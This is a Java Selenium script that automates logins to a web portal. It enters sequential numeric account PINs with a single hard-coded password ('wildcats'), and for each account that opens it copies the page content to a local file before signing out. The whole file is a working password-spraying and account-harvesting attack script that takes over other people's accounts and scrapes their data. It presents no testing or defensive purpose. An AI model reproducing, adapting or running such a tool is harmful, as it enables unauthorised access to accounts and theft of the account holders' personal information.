package bot;

import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import stringmanager.StringGetter;
import org.openqa.selenium.WebElement;
import java.awt.Robot;
import java.util.ArrayList;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;

public class WebTableAttempt {
//-------------------------------------------------------------------------------
	public static final int number = 1;			//BTW: MOST RECENT WAS:		|
	public static final int initialId = 20000005;	//20034130					|
	public static final String fileLocation = "C:/Users/Admin/Desktop/testingshit.txt";
	//-------------------------------------------------------------------------------
//	ALWAYS REMEMBER TO CLOSE ALL OTHER WINDOWS AND MINIMIZE CONSOLE
	public static int currentId = initialId;		
	public static final String pwd = "wildcats";

	public static void main(String[] args) throws Exception {
		Robot rbt = new Robot();
		ChromeOptions options = new ChromeOptions();
		options.addArguments("user-data-dir=" + Constants.userDataLocation);
		System.setProperty("webdriver.chrome.driver", Constants.webDriverLocation);		
		WebDriver driver = new ChromeDriver(options);										
		driver.get(Constants.appUrl);
		driver.manage().window().maximize();
		

		
		String actualTitle = driver.getTitle();		// fetch the title of the web page and save it into a string variable					
		if (Constants.expectedTitle.equals(actualTitle)) {	
			System.out.println("Verification Successful - The correct title is displayed on the web page.");
		} else {
			System.out.println("Verification Failed - An incorrect title is displayed on the web page.");
		}
		
		boolean loginFailed = true;
		WebDriverWait wait = new WebDriverWait(driver, 5);	
		
		for(int w = 0; w < number;w+=0) {
			loginFailed = true;			
			if(w==0) {		//Happens the first time the program is called
				WebElement username = driver.findElement(By.id("Pin"));
				username.clear();
				//username.sendKeys(Integer.toString(initialId));			
				
				((JavascriptExecutor)driver).executeScript("arguments[0].value = arguments[1];", username,initialId);
				
				WebElement password = driver.findElement(By.id("Password"));
				password.clear();
				//password.sendKeys(pwd);	
				
				((JavascriptExecutor)driver).executeScript("arguments[0].value = arguments[1];", password,pwd);
				
				WebElement SignInButton = driver.findElement(By.id("LoginButton"));
				SignInButton.click();
				WebElement ErrorMessage = driver.findElement(By.id("msgmessage"));						
				ArrayList<WebElement> elementsToFind = new ArrayList<WebElement>();
				elementsToFind.add(ErrorMessage);
				//elementsToFind.add(RemindLink);
				
				loginFailed = Util.loginFailed(driver, rbt, elementsToFind, wait);
				currentId = initialId;
			}			
			
			while (loginFailed == true && w < number) {										
				currentId = initialId + w;
				if(w!=0) {
					Util.fastClick(Constants.dummyXCoordinate, 668, rbt);
					WebElement username = driver.findElement(By.id("Pin"));
					username.clear();
					username.sendKeys(Integer.toString(initialId + w));			
					WebElement password = driver.findElement(By.id("Password"));
					password.clear();
					password.sendKeys(pwd);	
					WebElement SignInButton = driver.findElement(By.id("LoginButton"));
					SignInButton.click();
					
					WebElement ErrorMessage = driver.findElement(By.id("msgmessage"));					
					
					ArrayList<WebElement> elementsToFind = new ArrayList<WebElement>();
					elementsToFind.add(ErrorMessage);
										
					loginFailed = Util.loginFailed(driver, rbt, elementsToFind, wait);					
				}	
				if(loginFailed) {
					System.out.println("last one done(fail): " + currentId);
					w += 1; 
				}						
				if (loginFailed == true) {
					Util.fastClick(Constants.dummyXCoordinate, 668, rbt);
					wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("msgmessage")));
				}
			}
			
			if (loginFailed == false) {	
				wait.until(ExpectedConditions.invisibilityOfElementLocated(By.id("msgmessage")));
				//w+=1;	
				currentId = initialId + w;							
				System.out.println("last one done(success): " + currentId);		
				Thread.sleep(Constants.msDelayBetweenLandingAndScanning); 			
				Util.fetchContentToClipboard(rbt, Constants.msDelayBetweenSelectAndCopy);						
				Util.fastClick(Constants.dummyXCoordinate, 668, rbt);
				Thread.sleep(50);
				WebElement SignOutButton = driver.findElement(By.id("lbllogoutlink"));
				SignOutButton.click();				
				StringGetter.finisher(Util.clipboardContent(), driver, fileLocation);	
				w+=1;			
			}	
		}
		driver.quit();
	}
}
